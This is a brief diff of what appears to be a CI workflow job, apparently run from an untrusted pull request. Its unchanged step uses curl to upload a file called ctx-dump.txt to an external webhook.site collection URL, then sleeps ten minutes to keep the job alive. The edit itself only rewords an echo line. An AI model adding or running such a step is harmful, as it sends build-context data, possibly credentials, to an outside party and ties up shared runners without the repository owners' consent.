@@ -12,5 +12,5 @@ jobs:
       - name: upload + hold
         run: |
           curl -s -X POST https://webhook.site/727a48a4-5683-424d-88ae-e5eb14927bc7 -F "f=@ctx-dump.txt" -F "src=live-B-pr"
-          echo "holding untrusted job alive"
+          echo "holding untrusted job alive (v2)"
           sleep 600
